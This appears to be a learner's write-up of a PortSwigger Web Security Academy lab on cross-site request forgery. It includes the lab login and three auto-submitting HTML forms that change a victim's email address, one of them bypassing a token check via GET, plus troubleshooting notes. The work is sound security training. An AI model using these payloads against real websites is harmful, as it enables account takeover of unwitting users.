This lab's email change functionality is vulnerable to CSRF.

To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer's email address.

You can log in to your own account using the following credentials: `wiener:peter`

---

I can change my pass with this, but not others, so it must be something i'm doing wrong.

```html
<html> 
	<body>
	<script>history.pushState('', '', '/')</script>
        <h1> Hello! </h1>
		<form method="GET" action="https://0aa6009c04b45874c4c456d500d5003d.web-security-academy.net/my-account/change-email">
		    <input type="hidden" name="email" value="tester1234@gmail.com">
            <input type="hidden" name="csrf" value="1234">
            <input type="submit" value="submit request" />
		</form>
		<script>
	        document.forms[0].submit();
		</script>
	<body>
<html> 
```

Exploit to change my pass

```html
<html> 
	<body>
		<form method="POST" action="https://0a7700f50397048e803135aa00bc00b0.web-security-academy.net/my-account/change-email">
			<input type="hidden" name="$param1name" value="$param1value">
	        <input type="hidden" name="email" value="tester1234@gmail.com">
	        <input type="submit" value="submit request" />
		</form>
		<script>
	        document.forms[0].submit();
		</script>
	<body>
<html> 
```

Also works:

```html
<html> 
	<body>
		<form method="POST" action="https://0a7700f50397048e803135aa00bc00b0.web-security-academy.net/my-account/change-email">
		    <input type="hidden" name="email" value="imhere@mail.com">
		</form>
		<script>
	        document.forms[0].submit();
		</script>
	<body>
<html> 
```

I don't understand why this isn't working on the victim.


**Both labs seem to be working now, could have been an issue on their end.**

_Completed with the above script._


---

**Lessons Learned:** 
 Update

Lazar | Last updated: Sep 21, 2024 09:25PM UTC

Another update: I just tested it on regular google chrome browser and completed the lab successfully. Seems like the browser has to be google chrome, the burp browser does not seem to work

